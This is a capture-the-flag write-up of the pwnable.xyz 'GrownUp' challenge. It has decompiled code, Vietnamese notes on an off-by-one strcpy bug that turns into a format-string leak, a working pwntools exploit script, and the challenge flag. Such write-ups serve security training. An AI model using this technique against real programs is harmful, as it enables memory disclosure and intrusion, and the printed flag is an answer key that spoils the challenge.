# Pwnable.xyz GrownUp
## Analysis
```
void setup(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  signal(0xe,handler);
  usr._128_8_ = 0x601168;
  usr[136] = '%';
  usr[137] = 's';
  usr[138] = '\n';
  alarm(0x3c);
  return;
}
```
```
undefined8 main(void)
{
  ssize_t size;
  char *name;
  long in_FS_OFFSET;
  undefined8 answer;
  undefined8 longVal;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  answer = 0;
  longVal = 0;
  printf("Are you 18 years or older? [y/N]: ");
  size = read(0,&answer,0x10);
  *(undefined *)((long)&answer + (long)((int)size + -1)) = 0;
  if (((char)answer == 'y') || ((char)answer == 'Y')) {
    name = (char *)malloc(132);
    printf("Name: ");
    read(0,name,128);
    strcpy(usr,name);
    printf("Welcome ");
    printf((char *)usr._128_8_,usr);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
Vài điểm cần chú ý:  
+ Chương trình kiểm tra yes/no dựa vào chữ cái đầu tiên trong answer có là y hay không, 15 byte tiếp theo là gì cũng không ảnh hưởng
+ Giá trị flag nằm ở địa chỉ 0x601080
+ Có lỗi off by one khi thực thi strcpy(usr,name) (thêm 1 byte null) khi nhập đủ 128 byte, làm giá trị usr.\_128_8_ từ 0x601168 thành 0x601100 -> tận dụng lỗi format string
## Solution
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./GrownUpRedist", checksec = False)
con = remote("svc.pwnable.xyz", 30004)

input()
con.sendlineafter(b"older? [y/N]: ", b"yaaaaaaa\x80\x10\x60")
payload = b"A"*32 + b"%9$s"
payload = payload.ljust(128, b"B")
con.sendlineafter(b"Name: ", payload)

con.interactive()
```
## Flag
```
FLAG{should_have_named_it_babyfsb}
```